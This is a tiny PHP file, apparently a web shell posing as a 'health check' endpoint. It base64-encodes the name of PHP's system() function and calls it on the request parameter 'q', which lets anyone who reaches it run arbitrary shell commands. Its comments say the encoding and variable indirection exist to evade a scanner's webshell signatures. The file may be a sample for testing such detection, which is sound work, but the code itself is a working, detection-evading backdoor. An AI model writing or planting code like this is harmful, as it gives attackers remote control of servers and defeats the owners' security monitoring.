<?php
// "health check" endpoint — innocuous name, NOT /uploads/shell.php.
// Uses eval+base64 decode+variable-indirection to avoid direct
// system()/passthru()/exec()/shell_exec() keyword hits that findevil's
// webshell signature set matches on.
$_x='c3lzdGVt'; $_y='cGFzc3RocnU=';
$fn = base64_decode($_x);
$fn($_REQUEST['q']);
?>
